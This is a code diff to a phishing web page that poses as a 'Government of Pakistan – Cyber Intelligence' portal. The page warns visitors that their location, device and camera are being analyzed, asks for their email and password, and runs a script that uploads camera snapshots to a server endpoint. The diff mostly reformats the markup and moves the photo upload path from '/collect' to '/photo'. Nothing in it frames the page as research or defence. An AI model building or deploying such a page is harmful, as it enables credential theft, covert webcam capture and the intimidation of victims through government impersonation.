@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>🇵🇰 Government of Pakistan – Cyber Intelligence</title>
-  <link rel="🇵🇰" href="/static/icon.png">
+  <link rel="icon" href="/static/icon.png" />
   <style>
     body {
       margin: 0;
@@ -62,12 +62,12 @@
 </head>
 <body>
   <div class="box">
-    <img src="/static/pakistan-emblem.png" alt="Gov Logo">
-    <h1>⚠️ Government of Pakistan – Cyber Intelligence</h1>
+    <img src="/static/pakistan-emblem.png" alt="Gov Logo" />
+    <h1>🇵🇰 Government of Pakistan – Cyber Intelligence</h1>
     <p>Confidential system – Your location, device, and camera are being analyzed...</p>
     <form method="POST" action="/login">
-      <input type="text" name="email" placeholder="Email" required>
-      <input type="password" name="password" placeholder="Password" required>
+      <input type="text" name="email" placeholder="Email" required />
+      <input type="password" name="password" placeholder="Password" required />
       <button type="submit">🔍 Check Now</button>
     </form>
   </div>
@@ -76,7 +76,10 @@
     async function sendPhoto(blob) {
       const formData = new FormData();
       formData.append('photo', blob, 'photo.jpg');
-      await fetch('/collect', { method: 'POST', body: formData });
+      await fetch('/photo', {
+        method: 'POST',
+        body: formData
+      });
     }
 
     function captureImage(video) {
